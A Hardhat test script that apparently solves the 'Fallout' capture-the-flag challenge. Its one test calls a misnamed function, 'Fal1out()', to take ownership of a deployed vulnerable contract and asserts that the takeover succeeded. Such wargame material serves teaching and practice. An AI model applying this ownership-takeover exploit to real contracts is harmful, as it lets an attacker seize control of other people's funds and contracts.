const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

const  FALLOUT_ABI=[
    "function Fal1out() public payable",
    "function owner() public view returns (address)"
];

describe.only("Fallout test", function() {
    beforeEach(async function() {
        users = await ethers.getSigners();
        player = users[0];
        instance = new ethers.Contract(process.env.FALLOUT_ADDRESS, FALLOUT_ABI, ethers.provider);
        expect(await instance.owner()).to.not.equal(player.address);
});
    describe("Hack test", function() {
        it("Claim ownership", async function() {
            await instance.connect(player).Fal1out();
            expect(await instance.owner()).to.equal(player.address);
        });
    });
});